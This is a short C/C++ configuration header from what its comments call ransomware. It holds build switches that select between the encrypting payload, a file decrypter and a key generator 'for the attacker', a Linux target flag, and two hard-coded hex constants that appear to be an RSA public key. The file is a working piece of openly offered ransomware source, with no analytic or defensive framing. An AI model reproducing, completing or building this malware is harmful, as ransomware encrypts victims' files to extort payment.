#ifndef CONFIG
#define CONFIG
// define CRYPTER to compile the ransomware 
// define DECRYPTER to compile the file decrypter
// define KEYGEN to compile the key decryptor ( for the attacker )
// define LINUX to compile the ransomware for linux
//#define DECRYPTER
//#define CRYPTER
#define KEYGEN
#define LINUX
#ifndef LINUX
#define NOGDI
#define _CRT_SECURE_NO_WARNINGS
#endif
#define xn "0xa7b50716ee0261651cd296d14055ceb87d6f8bc7f898d13c36cf9b1fd14f8ad0133975bae9b189091b9def0431de0360b0eb4557daccc77543344d84fc491c6d"
#define xe "0xe05fa3b9b1c575193c2db954f4c5e1d3bb6ee62952eef6508c68c8bb86a3ccdf"
#include <string>
#include <string.h>
#endif
